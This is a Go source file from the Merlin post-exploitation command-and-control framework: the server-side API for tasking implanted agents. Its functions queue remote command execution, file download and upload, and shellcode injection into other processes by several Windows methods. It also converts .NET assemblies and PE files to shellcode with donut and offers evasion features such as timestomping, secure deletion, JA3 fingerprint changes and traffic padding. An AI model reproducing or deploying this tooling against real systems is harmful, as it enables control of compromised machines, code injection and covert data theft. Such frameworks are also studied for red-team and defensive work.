// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agents

import (
	// Standard
	"encoding/base64"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	uuid "github.com/satori/go.uuid"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agents"
	"github.com/Ne0nd0g/merlin/pkg/api/messages"
	"github.com/Ne0nd0g/merlin/pkg/modules/donut"
	"github.com/Ne0nd0g/merlin/pkg/modules/shellcode"
	"github.com/Ne0nd0g/merlin/pkg/modules/winapi/createprocess"
	"github.com/Ne0nd0g/merlin/pkg/server/jobs"
)

// CD is used to change the agent's current working directory
func CD(agentID uuid.UUID, Args []string) messages.UserMessage {
	var args []string
	if len(Args) > 1 {
		args = []string{Args[1]}
	} else {
		return messages.ErrorMessage("a directory path must be provided")
	}
	job, err := jobs.Add(agentID, "cd", args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// ClearCreatedJobs clears all created (but unsent) jobs for all agents
func ClearCreatedJobs() messages.UserMessage {
	jobs.ClearAll()
	return messages.UserMessage{
		Level:   messages.Success,
		Message: fmt.Sprintf("All unsent jobs cleared at %s", time.Now().UTC().Format(time.RFC3339)),
		Time:    time.Now().UTC(),
		Error:   false,
	}
}

// ClearJobs removes any jobs the queue that have been created, but NOT sent to the agent
func ClearJobs(agentID uuid.UUID) messages.UserMessage {
	err := jobs.Clear(agentID)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.UserMessage{
		Level:   messages.Success,
		Message: fmt.Sprintf("jobs cleared for agent %s at %s", agentID, time.Now().UTC().Format(time.RFC3339)),
		Time:    time.Now().UTC(),
		Error:   false,
	}
}

// CMD is used to send a command to the agent to run a command or execute a program
// Args[0] = "cmd"
// Args[1:] = program and arguments to be executed on the host OS of the running agent
// Used with `cmd` and `shell` commands as well as through "standard" modules
func CMD(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 1 {
		job, err := jobs.Add(agentID, Args[0], Args[1:])
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage("not enough arguments provided for the Agent Cmd call")
}

// Download is used to download the file through the corresponding agent from the provided input file path
// Args[0] = download
// Args[1] = file path to download
func Download(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) >= 2 {
		job, err := jobs.Add(agentID, "download", []string{Args[1]})
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent Download call: %s", Args))
}

// ExecuteAssembly calls the donut module to create shellcode from a .NET 4.0 assembly and then uses the CreateProcess
// module to create a job that executes the shellcode in a remote process
func ExecuteAssembly(agentID uuid.UUID, Args []string) messages.UserMessage {

	// Set the assembly filepath
	var assembly string
	if len(Args) > 1 {
		assembly = Args[1]
	} else {
		return messages.ErrorMessage("the .NET assembly file path was not provided for execute-assembly")
	}

	// Set the assembly arguments, if any
	// File path is checked in the donut module
	var params string
	if len(Args) > 2 {
		params = Args[2]
	}

	// Set the SpawnTo path
	options := make(map[string]string)
	if len(Args) > 3 {
		options["spawnto"] = Args[3]
	} else {
		options["spawnto"] = "C:\\Windows\\System32\\dllhost.exe"
	}

	// Set the SpawnTo arguments, if any
	if len(Args) > 4 {
		options["args"] = Args[4]
	} else {
		options["args"] = ""
	}

	// Build Donut Config
	config := donut.GetDonutDefaultConfig()
	config.ExitOpt = 2
	config.Type = 2 //DONUT_MODULE_NET_EXE = 2; .NET EXE. Executes Main if no class and method provided
	//config.Runtime = "v4.0.30319"
	config.Entropy = 3
	config.Parameters = params

	// Convert assembly into shellcode with donut
	donutBuffer, err := donut.BytesFromConfig(assembly, config)
	if err != nil {
		return messages.ErrorMessage(fmt.Sprintf("error turning assembly into shellcode bytes with donut:\r\n%s", err))
	}
	options["shellcode"] = base64.StdEncoding.EncodeToString(donutBuffer.Bytes())

	//Get CreateProcess job
	j, err := createprocess.Parse(options)
	if err != nil {
		return messages.ErrorMessage(fmt.Sprintf("error generating a CreateProcess job:\r\n%s", err))
	}

	// Add job to the Agent's queue
	job, err := jobs.Add(agentID, j[0], j[1:])
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// ExecutePE calls the donut module to create shellcode from PE and then uses the CreateProcess
// module to create a job that executes the shellcode in a remote process
func ExecutePE(agentID uuid.UUID, Args []string) messages.UserMessage {

	// Set the assembly filepath
	var pe string
	if len(Args) > 1 {
		pe = Args[1]
	} else {
		return messages.ErrorMessage("the PE file path was not provided for execute-pe")
	}

	// Set the assembly arguments, if any
	// File path is checked in the donut module
	var params string
	if len(Args) > 2 {
		params = Args[2]
	}

	// Set the SpawnTo path
	options := make(map[string]string)
	if len(Args) > 3 {
		options["spawnto"] = Args[3]
	} else {
		options["spawnto"] = "C:\\Windows\\System32\\dllhost.exe"
	}

	// Set the SpawnTo arguments, if any
	if len(Args) > 4 {
		options["args"] = Args[4]
	} else {
		options["args"] = ""
	}

	// Build Donut Config
	config := donut.GetDonutDefaultConfig()
	config.ExitOpt = 2
	config.Parameters = params

	// Convert assembly into shellcode with donut
	donutBuffer, err := donut.BytesFromConfig(pe, config)
	if err != nil {
		return messages.ErrorMessage(fmt.Sprintf("error turning pe into shellcode bytes with donut:\r\n%s", err))
	}
	options["shellcode"] = base64.StdEncoding.EncodeToString(donutBuffer.Bytes())

	//Get CreateProcess job
	j, err := createprocess.Parse(options)
	if err != nil {
		return messages.ErrorMessage(fmt.Sprintf("error generating a CreateProcess job:\r\n%s", err))
	}

	// Add job to the Agent's queue
	job, err := jobs.Add(agentID, j[0], j[1:])
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// ExecuteShellcode calls the corresponding shellcode module to create a job that executes the provided shellcode
// Args[0] = "execute-shellcode
// Args[1] = Shellcode execution method [self, remote, rtlcreateuserthread, userapc]
func ExecuteShellcode(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 2 {
		options := make(map[string]string)
		switch strings.ToLower(Args[1]) {
		case "self":
			options["method"] = "self"
			options["pid"] = ""
			options["shellcode"] = strings.Join(Args[2:], " ")
		case "remote":
			if len(Args) > 3 {
				options["method"] = "remote"
				options["pid"] = Args[2]
				options["shellcode"] = strings.Join(Args[3:], " ")
			} else {
				return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent ExecuteShellcode (remote) call: %s", Args))
			}
		case "rtlcreateuserthread":
			if len(Args) > 3 {
				options["method"] = "rtlcreateuserthread"
				options["pid"] = Args[2]
				options["shellcode"] = strings.Join(Args[3:], " ")
			} else {
				return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent ExecuteShellcode (rtlcreateuserthread) call: %s", Args))
			}
		case "userapc":
			if len(Args) > 3 {
				options["method"] = "userapc"
				options["pid"] = Args[2]
				options["shellcode"] = strings.Join(Args[3:], " ")
			} else {
				return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent ExecuteShellcode (userapc) call: %s", Args))
			}
		default:
			return messages.ErrorMessage(fmt.Sprintf("invalide ExecuteShellcode method: %s", Args[1]))
		}
		if len(options) > 0 {
			sh, errSh := shellcode.Parse(options)
			if errSh != nil {
				m := fmt.Sprintf("there was an error parsing the shellcode:\r\n%s", errSh.Error())
				return messages.ErrorMessage(m)
			}
			job, err := jobs.Add(agentID, sh[0], sh[1:])
			if err != nil {
				return messages.ErrorMessage(err.Error())
			}
			return messages.JobMessage(agentID, job)
		}
	}
	return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent ExecuteShellcode call: %s", Args))
}

// GetAgents returns a list of existing Agent UUID values
func GetAgents() (agentList []uuid.UUID) {
	for id := range agents.Agents {
		agentList = append(agentList, id)
	}
	return
}

// GetAgentsRows returns a row of data for every agent that includes information about it such as
// the Agent's GUID, platform, user, host, transport, and status
func GetAgentsRows() (header []string, rows [][]string) {
	header = []string{"Agent GUID",
		"Host",
		"Note",
		"Platform",
		"C2",
		"Status",
		"Last Checkin",
		"User",
		"Process"}

	for _, agent := range agents.Agents {

		// Get the process name, sans full path
		var proc string
		if agent.Platform == "windows" {
			proc = agent.Process[strings.LastIndex(agent.Process, "\\")+1:]
		} else {
			proc = agent.Process[strings.LastIndex(agent.Process, "/")+1:]
		}

		status, _ := GetAgentStatus(agent.ID)
		rows = append(rows, []string{agent.ID.String()[:8] + "...",
			agent.HostName,
			agent.Note,
			agent.Platform + "/" + agent.Architecture,
			agent.Proto,
			status,
			lastCheckin(agent.StatusCheckIn) + " ago",
			agent.UserName,
			fmt.Sprintf("%s(%d)", proc, agent.Pid)})
	}
	return
}

// GetAgentInfo returns rows of data about an Agent's configuration that can be displayed in a table
func GetAgentInfo(agentID uuid.UUID) ([][]string, messages.UserMessage) {
	var rows [][]string
	a, ok := agents.Agents[agentID]
	if !ok {
		return rows, messages.ErrorMessage(fmt.Sprintf("%s is not a valid agent", agentID))
	}

	status, message := GetAgentStatus(agentID)
	if message.Error {
		return rows, message
	}

	// If the full path of the Process is too long, it makes the table ugly
	// This should cover most use cases
	procName := a.Process
	if len(procName) > 80 {
		var delim rune
		if a.Platform == "windows" {
			delim = '\\'
		} else {
			delim = '/'
		}
		procName = wordWrap(procName, delim, 60)
	}

	// Find all the groups that this agent is a member of
	var groups = []string{}
	for _, row := range agents.GroupListAll() {
		if row[1] == a.ID.String() {
			groups = append(groups, row[0])
		}
	}

	rows = [][]string{
		{"ID", a.ID.String()},
		{"Status", status},
		{"Platform", a.Platform},
		{"Architecture", a.Architecture},
		{"Note", a.Note},
		{"Groups", fmt.Sprintf("%s", strings.Join(groups, ", "))},
		{"", ""},
		{"IP", fmt.Sprintf("%s", strings.Join(a.Ips, "\n"))},
		{"UserName", a.UserName},
		{"User GUID", a.UserGUID},
		{"Hostname", a.HostName},
		{"Machine ID", a.MachineID},
		{"Process ID", strconv.Itoa(a.Pid)},
		{"Process Name", procName},
		{"Covert Config", a.CovertConfig},
		{"Initial Check In", a.InitialCheckIn.Format(time.RFC3339)},
		{"Last Check In", fmt.Sprintf("%s (%s)", a.StatusCheckIn.Format(time.RFC3339), lastCheckin(a.StatusCheckIn))},
		{"", ""},
		{"Agent Version", a.Version},
		{"Agent Build", a.Build},
		{"Agent Wait Time Min", strconv.FormatInt(a.WaitTimeMin, 10)},
		{"Agent Wait Time Max", strconv.FormatInt(a.WaitTimeMax, 10)},
		{"Agent Active Min", strconv.FormatInt(a.ActiveMin, 10)},
		{"Agent Active Max", strconv.FormatInt(a.ActiveMax, 10)},
		{"Agent Inactive Multiplier", strconv.FormatInt(a.InactiveMultiplier, 10)},
		{"Agent Inactive Threshold", strconv.Itoa(a.InactiveThreshold)},
		{"Agent Message Padding Max", strconv.Itoa(a.PaddingMax)},
		{"Agent Max Retries", strconv.Itoa(a.MaxRetry)},
		{"Agent Failed Check In", strconv.Itoa(a.FailedCheckin)},
		{"Agent Kill Date", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)},
		{"Agent Communication Protocol", a.Proto},
		{"Agent JA3 TLS Client Signature", a.JA3},
	}
	return rows, messages.UserMessage{}
}

// GetAgentStatus determines if the agent is active, delayed, or dead based on its last checkin time
func GetAgentStatus(agentID uuid.UUID) (string, messages.UserMessage) {
	var status string
	agent, ok := agents.Agents[agentID]
	if !ok {
		return status, messages.ErrorMessage(fmt.Sprintf("%s is not a valid agent", agentID))
	}
	dur := time.Duration(agent.WaitTimeMax) * time.Second
	if agent.StatusCheckIn.Add(dur * 3).After(time.Now()) { // little extra wiggle room
		status = "Active"
	} else if agent.StatusCheckIn.Add(dur * 6).After(time.Now()) {
		status = "Delayed"
	} else {
		status = "Dead"
	}
	return status, messages.UserMessage{}
}

// GetCreatedJobs enumerates all created (but unsent) jobs across all agents
func GetCreatedJobs() [][]string {
	return jobs.GetTableCreated()
}

// GetJobsForAgent enumerates all jobs and their status
func GetJobsForAgent(agentID uuid.UUID) ([][]string, messages.UserMessage) {
	jobsRows, err := jobs.GetTableActive(agentID)
	if err != nil {
		return nil, messages.ErrorMessage(err.Error())
	}
	return jobsRows, messages.UserMessage{}
}

// Add an agent to a server-side grouping
func GroupAdd(agentID uuid.UUID, groupName string) messages.UserMessage {
	if groupName == "all" {
		return messages.UserMessage{
			Level:   messages.Info,
			Time:    time.Now().UTC(),
			Message: fmt.Sprintf("Global group 'all' is immutable."),
		}
	}

	err := agents.GroupAddAgent(agentID, groupName)
	if err == nil {
		return messages.UserMessage{
			Level:   messages.Info,
			Time:    time.Now().UTC(),
			Message: fmt.Sprintf("Agent %s added to group %s", agentID.String(), groupName),
		}
	}
	return messages.ErrorMessage(err.Error())
}

// List agents that are part of a specific group
func GroupList(groupName string) []string {
	var out = []string{}
	for _, row := range agents.GroupListAll() {
		if row[0] == groupName {
			out = append(out, row[1])
		}
	}
	return out
}

// Returns a table of {groupName, agentID}
func GroupListAll() [][]string {
	return agents.GroupListAll()
}

// Returns array of active group names
func GroupListNames() []string {
	return agents.GroupListNames()
}

// Remove an agent from a group
func GroupRemove(agentID uuid.UUID, groupName string) messages.UserMessage {
	if groupName == "all" {
		return messages.UserMessage{
			Level:   messages.Info,
			Time:    time.Now().UTC(),
			Message: fmt.Sprintf("Global group 'all' is immutable."),
		}
	}
	err := agents.GroupRemoveAgent(agentID, groupName)
	if err == nil {
		return messages.UserMessage{
			Level:   messages.Info,
			Time:    time.Now().UTC(),
			Message: fmt.Sprintf("Agent %s removed from group %s", agentID.String(), groupName),
		}
	}
	return messages.ErrorMessage(err.Error())
}

// Performs a one-off single sleep for the supplied amount in seconds
func Hibernate(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) < 2 {
		return messages.ErrorMessage("Not enough arguments. Amount of time in seconds not provided.")
	}
	job, err := jobs.Add(agentID, "hibernate", Args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// InvokeAssembly executes an assembly that was previously loaded with the load-assembly command
func InvokeAssembly(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) < 1 {
		return messages.ErrorMessage("not enough arguments, the assembly name must be provided")
	}
	job, err := jobs.Add(agentID, Args[0], Args[1:])
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// Ipconfig lists the agent's network adapter information
func Ipconfig(agentID uuid.UUID, Args []string) messages.UserMessage {
	job, err := jobs.Add(agentID, "ifconfig", nil)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// Exit instructs the agent to quit running
func Exit(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 0 {
		job, err := jobs.Add(agentID, "exit", Args[0:])
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent Exit call: %s", Args))
}

func KillProcess(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) == 2 {
		pid, err := strconv.Atoi(Args[1])
		if err != nil || pid < 0 {
			return messages.ErrorMessage(fmt.Sprintf("Invalid PID provided: %s\n", Args[1]))
		}
		args := []string{Args[1]}
		job, err := jobs.Add(agentID, "kill", args)
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent Kill call: %s", Args))
}

// ListAssemblies instructs the agent to list all of the .NET assemblies that are currently loaded into the agent's process
// .NET assemblies are loaded with the LoadAssembly call
func ListAssemblies(agentID uuid.UUID) messages.UserMessage {
	job, err := jobs.Add(agentID, "list-assemblies", []string{})
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// LoadAssembly reads in a .NET assembly and sends it to the agent so it can be loaded
// into a CLR AppDomain for later execution
func LoadAssembly(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) < 1 {
		return messages.ErrorMessage("not enough arguments, an assembly must be provided")
	}
	_, err := os.Stat(Args[1])
	if err != nil {
		return messages.ErrorMessage(fmt.Sprintf("there was an error accessing the assembly:\n%s", err))
	}
	job, err := jobs.Add(agentID, Args[0], Args[1:])
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// LoadCLR loads the .NET Common Language Runtime (CLR) into the agent's process
// .NET assemblies can subsequently be loaded with the LoadAssembly call and executed with the InvokeAssembly call
func LoadCLR(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) < 1 {
		return messages.ErrorMessage("not enough arguments, a .NET version must be provided")
	}
	job, err := jobs.Add(agentID, Args[0], Args[1:])
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// Netstat is used to print network connections on the target system
// Supports a "-p tcp" or "-p udp"
func NETSTAT(agentID uuid.UUID, Args []string) messages.UserMessage {
	// Ensure the provided args are valid
	// Args[0] = "netstat"
	// Args[1] = (optional) "-p"
	// Args[2] = (optional) "tcp" or "udp"
	if len(Args) > 3 {
		return messages.ErrorMessage("Too many arguments provided to the netstat command")
	} else if len(Args) == 2 {
		return messages.ErrorMessage("Incorrect arguments provided to the netstat command")
	} else if len(Args) == 3 {
		if Args[1] != "-p" {
			return messages.ErrorMessage("Incorrect arguments provided to the netstat command")
		} else if !(Args[2] == "tcp" || Args[2] == "udp") {
			return messages.ErrorMessage("Incorrect arguments provided to the netstat command")
		}
	}
	job, err := jobs.Add(agentID, "netstat", Args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// NSLOOKUP instructs the agent to perform a DNS query on the input
func NSLOOKUP(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) < 1 {
		return messages.ErrorMessage("not enough arguments. A query was not provided")
	}
	job, err := jobs.Add(agentID, "nslookup", Args[1:])
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// LS uses native Go to list the directory
func LS(agentID uuid.UUID, Args []string) messages.UserMessage {
	var args []string
	if len(Args) > 1 {
		args = []string{Args[1]}
	}
	job, err := jobs.Add(agentID, "ls", args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// Pipes displays running processes
func PIPES(agentID uuid.UUID, Args []string) messages.UserMessage {
	job, err := jobs.Add(agentID, "pipes", nil)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// PS displays running processes
func PS(agentID uuid.UUID, Args []string) messages.UserMessage {
	job, err := jobs.Add(agentID, "ps", nil)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// PWD is used to print the Agent's current working directory
func PWD(agentID uuid.UUID, Args []string) messages.UserMessage {
	job, err := jobs.Add(agentID, "pwd", Args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// Remove deletes the agent from the server
func Remove(agentID uuid.UUID) messages.UserMessage {
	err := agents.RemoveAgent(agentID)
	if err == nil {
		return messages.UserMessage{
			Level:   messages.Info,
			Time:    time.Now().UTC(),
			Message: fmt.Sprintf("Agent %s was removed from the server at %s", agentID, time.Now().UTC().Format(time.RFC3339)),
		}
	}
	return messages.ErrorMessage(err.Error())
}

// Securely deletes supplied file
func SecureDelete(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) < 2 {
		return messages.ErrorMessage("Not enough arguments. A file path was not provided.")
	}
	job, err := jobs.Add(agentID, "sdelete", Args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// SetInactiveMultiplier configures how much the agent will slow down once the InactiveThreshold is met
// Args[0] = "inactivemultiplier"
// Args[1] = int64
func SetInactiveMultiplier(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) == 2 {
		NewInactiveMultiplier, err := strconv.ParseInt(Args[1], 10, 64)
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		if NewInactiveMultiplier > 0 {
			job, err2 := jobs.Add(agentID, "inactivemultiplier", Args)
			if err2 != nil {
				return messages.ErrorMessage(err2.Error())
			}
			return messages.JobMessage(agentID, job)
		}
		return messages.ErrorMessage(fmt.Sprintf("InactiveMultiplier value must be greater than zero: %s", Args))
	} else {
		return messages.ErrorMessage(fmt.Sprintf("Incorrect number of arguments provided for the Agent SetInactiveMultiplier call: %s", Args))
	}
}

// SetInactiveThreshold configures how many check ins with no queued commands will make the agent go inactive
// Args[0] = "inactivethreshold"
// Args[1] = int
func SetInactiveThreshold(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) == 2 {
		NewInactiveThreshold, err := strconv.Atoi(Args[1])
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		if NewInactiveThreshold > 0 {
			job, err2 := jobs.Add(agentID, "inactivethreshold", Args)
			if err2 != nil {
				return messages.ErrorMessage(err2.Error())
			}
			return messages.JobMessage(agentID, job)
		}
		return messages.ErrorMessage(fmt.Sprintf("InactiveThreshold value must be greater than zero: %s", Args))
	} else {
		return messages.ErrorMessage(fmt.Sprintf("Incorrect number of arguments provided for the Agent SetInactiveThreshold call: %s", Args))
	}
}

// SetJA3 is used to change the Agent's JA3 signature
func SetJA3(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 1 {
		job, err := jobs.Add(agentID, "ja3", Args)
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent SetJA3 call: %s", Args))
}

// SetKillDate configures the date and time that the agent will stop running
func SetKillDate(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 1 {
		_, errU := strconv.ParseInt(Args[1], 10, 64)
		if errU != nil {
			m := fmt.Sprintf("There was an error converting %s to an int64", Args[1])
			m = m + "\r\nKill date takes in a UNIX epoch timestamp such as 811123200 for September 15, 1995"
			return messages.ErrorMessage(m)
		}
		job, err := jobs.Add(agentID, "killdate", Args)
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent SetKillDate call: %s", Args))
}

// SetMaxRetry configures the amount of times an Agent will try to checkin before it quits
func SetMaxRetry(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 1 {
		_, errU := strconv.ParseInt(Args[1], 10, 64)
		if errU != nil {
			m := fmt.Sprintf("There was an error converting %s to an int64\n", Args[1])
			return messages.ErrorMessage(m)
		}
		job, err := jobs.Add(agentID, "maxretry", Args)
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent SetMaxRetry call: %s", Args))
}

// Set an agent note
func SetNote(agentID uuid.UUID, Args []string) messages.UserMessage {
	note := strings.Join(Args, " ")
	err := agents.SetAgentNote(agentID, note)
	if err == nil {
		return messages.UserMessage{
			Level:   messages.Info,
			Time:    time.Now().UTC(),
			Message: fmt.Sprintf("Agent %s's note set to %s", agentID, note),
		}
	}
	return messages.ErrorMessage(err.Error())
}

// SetPadding configures the maxium size for the random amount of padding added to each message
func SetPadding(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 1 {
		_, errU := strconv.ParseInt(Args[1], 10, 64)
		if errU != nil {
			m := fmt.Sprintf("There was an error converting %s to an int64\n", Args[1])
			return messages.ErrorMessage(m)
		}
		job, err := jobs.Add(agentID, "padding", Args)
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent SetPadding call: %s", Args))
}

// SetSleep configures the Agent's sleep time between checkins
func SetSleep(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) == 3 {
		NewWaitTimeMin, err1 := strconv.ParseInt(Args[1], 10, 64)
		if err1 != nil {
			return messages.ErrorMessage(err1.Error())
		}
		NewWaitTimeMax, err2 := strconv.ParseInt(Args[2], 10, 64)
		if err2 != nil {
			return messages.ErrorMessage(err2.Error())
		}
		if NewWaitTimeMin > 0 && NewWaitTimeMax > 0 && NewWaitTimeMax >= NewWaitTimeMin {
			job, err := jobs.Add(agentID, "sleep", Args)
			if err != nil {
				return messages.ErrorMessage(err.Error())
			}
			return messages.JobMessage(agentID, job)
		}
		return messages.ErrorMessage(fmt.Sprintf("First value (min) must be smaller than second value (max): %s", Args))
	} else if len(Args) == 2 {
		NewWaitTime, err3 := strconv.ParseInt(Args[1], 10, 64)
		if err3 != nil {
			return messages.ErrorMessage(err3.Error())
		}
		if NewWaitTime > 0 {
			Args = append(Args, Args[1])
			job, err := jobs.Add(agentID, "sleep", Args)
			if err != nil {
				return messages.ErrorMessage(err.Error())
			}
			return messages.JobMessage(agentID, job)
		}
		return messages.ErrorMessage(fmt.Sprintf("Sleep value must be greater than zero: %s", Args))
	} else {
		return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent SetSleep call: %s", Args))
	}
}

// Match destination file's timestamps with source file
func Touch(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) < 3 {
		return messages.ErrorMessage("Not enough arguments.")
	}
	job, err := jobs.Add(agentID, "touch", Args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// Upload transfers a file from the Merlin Server to the Agent
func Upload(agentID uuid.UUID, Args []string) messages.UserMessage {
	// Make sure there are enough arguments
	// Validate the source file exists
	// Create job
	if len(Args) >= 3 {
		_, errF := os.Stat(Args[1])
		if errF != nil {
			m := fmt.Sprintf("there was an error accessing the source upload file:\r\n%s", errF.Error())
			return messages.ErrorMessage(m)
		}
		job, err := jobs.Add(agentID, "upload", Args[1:3])
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)

	}
	return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent Upload call: %s", Args))
}

// UPTIME displays running processes
func UPTIME(agentID uuid.UUID, Args []string) messages.UserMessage {
	job, err := jobs.Add(agentID, "uptime", nil)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// Splits a string into newlines
// Implementation improvised from https://gist.github.com/kennwhite/306317d81ab4a885a965e25aa835b8ef
func wordWrap(text string, delim rune, maxLen int) string {
	f := func(c rune) bool {
		return c == delim
	}
	words := strings.FieldsFunc(text, f)
	wrapped := words[0]
	spaceLeft := maxLen - len(wrapped)
	for _, word := range words[1:] {
		if len(word)+1 > spaceLeft {
			wrapped += string(delim) + "\n" + word
		} else {
			wrapped += string(delim) + word
			spaceLeft -= 1 + len(word)
		}
	}
	return wrapped
}

// Returns a nicely printed string for time since the last checkin (HH:MM:SS)
func lastCheckin(t time.Time) string {
	lastTime := time.Since(t)
	lastTimeStr := fmt.Sprintf("%d:%02d:%02d",
		int(lastTime.Hours()),
		int(lastTime.Minutes())%60,
		int(lastTime.Seconds())%60)

	return lastTimeStr
}
